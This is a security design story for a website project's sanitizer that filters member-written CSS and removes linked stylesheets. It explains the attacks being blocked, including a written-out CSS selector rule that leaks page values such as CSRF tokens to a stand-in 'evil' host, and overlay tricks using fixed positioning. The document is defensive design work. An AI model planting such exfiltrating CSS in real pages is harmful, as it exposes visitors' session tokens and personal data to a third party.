<!--
Copyright (c) Bruce Perens K6BP.
SPDX-License-Identifier: AGPL-3.0-or-later
-->

# Story: A Member Can Style Their Page, Not Read the Viewer's Page Through It

As a **Member** with a personal page, I want to write a `<style>` block, so that my page looks the
way I want. As a **Visitor**, I want that style to be unable to send anything about my session to
another site, and unable to cover the site's own navigation with a forged form. As a **Security
Reviewer**, I want that to hold by construction `[@ANCHOR: zero_sudo:css_stylesheet_filter]`.

## The Problem

A member `<style>` runs no script, but `input[value^="a"] { background: url(https://evil/a) }` makes
the visitor's browser request a different URL for each guess at any value on the page, the CSRF
token field and the visitor's own name included, and `position: fixed` covers the site's header.
`<link rel="stylesheet" href="https://...">` makes every visitor fetch from a host the member chose.

## Design

`website.page._sanitize_user_arch` `[@ANCHOR: user_websites:page_arch_style_link_filter]` removes
every `<link>` element and rebuilds each `<style>` from `zero_sudo.css_sanitizer.sanitize_stylesheet`:
style rules, `@media` and `@keyframes` only; selectors from a plain character set; declarations with
no `url()` except `url(#fragment)`, no `image-set()`/`image()`/`src()`/`element()`/`attr()`, no
`expression`/`behavior`/`javascript:`/`data:`, no escapes, and `position` only `static`, `relative`
or `absolute`. Anything else is dropped rule by rule, so one bad declaration does not cost the
member the rest of the sheet. The output is stable: filtering it again changes nothing.

Neither removal counts as an injection attempt (no strike): a linked web font or a fixed header is
not an attack; the removal is logged.

## Known limit

Update: the `style=""` attribute limit described below has since been closed. The
[user_websites README](../../../user_websites/README.md) ("Member CSS") records that every `style="..."` attribute is now filtered
declaration by declaration with the same sanitizer; read the paragraph below as the original limit.

`position: absolute` is kept: it only escapes its container when no ancestor is positioned, and
members use it for ordinary layouts. A `style=""` attribute on an element is not filtered by this
(it cannot select other elements, so it cannot read the page, but it can still carry `url()` and
`position: fixed`). Whether to filter it too changes what members' existing pages look like, so it is
a question for the site owner, not decided here.

Tests `[@ANCHOR: test_css_stylesheet_filter]` (the filter alone) and
`[@ANCHOR: test_user_arch_style_link_filter]` (the member save path and the served page).
